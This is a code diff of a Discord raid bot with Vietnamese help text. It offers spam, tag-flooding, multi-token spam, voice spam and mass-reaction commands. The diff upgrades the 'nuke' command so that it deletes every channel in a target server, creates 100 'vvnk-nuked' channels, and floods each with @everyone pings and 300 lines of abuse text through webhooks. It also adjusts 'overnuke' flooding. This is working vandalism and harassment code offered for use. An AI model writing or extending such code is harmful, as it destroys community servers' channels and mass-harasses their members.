@@ -199,8 +199,8 @@ async def on_command_error(ctx, error):
             "spam": ".spam [delay] [channel_id] [noi_dung] (bo trong channel = kenh hien tai)",
             "nhay": ".nhay [delay] [channel_id] [@user] (bo qua = kenh hien tai, khong tag)",
             "webhook": ".webhook [url] [noi_dung]",
-            "nuke": ".nuke [server] - xả nhay.txt 100 dòng/tất cả kênh",
-            "overnuke": ".overnuke [server] - xả nhay.txt 300 dòng/tất cả kênh",
+            "nuke": ".nuke [server] - xóa kênh + tạo 100 kênh + 300 dòng/kenh",
+            "overnuke": ".overnuke [server] - xả 150 dòng nhay.txt tất cả kênh",
             "tokenspam": ".tokenspam [delay] [file/noi_dung]",
             "massreact": ".massreact [so] [emoji]",
             "kick": ".kick [@user]",
@@ -400,8 +400,8 @@ Raid
 .tokenvc [idvoice]                     : Treo voice đa token
 .vcspam [idvoice]                      : Spam join/leave voice
 .massreact [so_tin_nhan] [emoji]       : Thêm phản ứng hàng loạt
-.nuke [server]                         : Xả nhay.txt 100 dòng/tất cả kênh
-.overnuke [server]                     : Xả nhay.txt 300 dòng/tất cả kênh
+.nuke [server]                         : Xóa kênh + tạo 100 kênh + 300 dòng/kenh
+.overnuke [server]                     : Xả 150 dòng nhay.txt tất cả kênh
 .stop                                 : Dừng tất cả
 ```"""
     try:
@@ -1147,10 +1147,27 @@ async def nuke(ctx, server: str):
             await ctx.send(f"# __{__NAME__}__\n **Không tìm thấy nhay.txt**")
             return
         await ctx.send(f"# __{__NAME__}__\n **Đang nuke: {guild.name}...**")
+        can_manage = guild.me.guild_permissions.manage_channels
+        if can_manage:
+            for channel in guild.channels:
+                try:
+                    await channel.delete()
+                except:
+                    pass
         text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
+        if can_manage:
+            nuke_channels = []
+            for i in range(1, 101):
+                try:
+                    ch = await guild.create_text_channel(f"vvnk-nuked-{i}")
+                    nuke_channels.append(ch)
+                except:
+                    break
+            text_channels = nuke_channels
         async def spam_channel(channel, lines):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
+                await webhook.send(content="@everyone")
                 for line in lines:
                     try:
                         await webhook.send(content=line)
@@ -1161,10 +1178,10 @@ async def nuke(ctx, server: str):
                 print(f"Loi {channel.name}: {e}")
         tasks = []
         for channel in text_channels:
-            lines = [random.choice(nhay_list) for _ in range(100)]
+            lines = [random.choice(nhay_list) for _ in range(300)]
             tasks.append(spam_channel(channel, lines))
         await asyncio.gather(*tasks)
-        await ctx.send(f"# __{__NAME__}__\n **Nuked {guild.name} - {len(text_channels)} kenh, 100 dong/kenh**")
+        await ctx.send(f"# __{__NAME__}__\n **Nuked {guild.name} - {len(text_channels)} kenh, 300 dong/kenh**")
     except discord.Forbidden:
         await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission**")
     except Exception as e:
@@ -1189,9 +1206,10 @@ async def overnuke(ctx, server: str):
             return
         await ctx.send(f"# __{__NAME__}__\n **Đang overnuke: {guild.name}...**")
         text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
-        async def spam_channel_batch(channel, lines, batch_num):
+        async def spam_channel(channel, lines):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
+                await webhook.send(content="@everyone")
                 for line in lines:
                     try:
                         await webhook.send(content=line)
@@ -1200,14 +1218,12 @@ async def overnuke(ctx, server: str):
                     await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Loi {channel.name}: {e}")
-        for batch in range(3):
-            tasks = []
-            for channel in text_channels:
-                lines = [random.choice(nhay_list) for _ in range(100)]
-                tasks.append(spam_channel_batch(channel, lines, batch+1))
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(0.5)
-        await ctx.send(f"# __{__NAME__}__\n **Overnuked {guild.name} - {len(text_channels)} kenh, 300 dong/kenh**")
+        tasks = []
+        for channel in text_channels:
+            lines = [random.choice(nhay_list) for _ in range(150)]
+            tasks.append(spam_channel(channel, lines))
+        await asyncio.gather(*tasks)
+        await ctx.send(f"# __{__NAME__}__\n **Overnuked {guild.name} - {len(text_channels)} kenh, 150 dong/kenh**")
     except discord.Forbidden:
         await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission**")
     except Exception as e:
